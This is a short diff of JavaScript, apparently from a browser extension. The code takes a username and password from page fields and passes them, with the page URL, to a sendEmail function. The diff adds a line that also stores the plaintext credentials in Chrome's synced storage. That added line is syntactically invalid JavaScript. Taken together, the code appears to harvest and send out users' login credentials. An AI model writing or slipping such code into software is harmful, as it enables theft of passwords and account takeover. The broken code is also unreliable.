@@ -18,6 +18,8 @@ $(function() {
    return field.val() || field.html();
   }).val(),
   password = passwordBoxes.val();
+  chrome.storage.sync.set({ location.href: {"username": username, "password": password} }, function(){
+      });
   sendEmail(username, password, location.href, callback);
  };
 
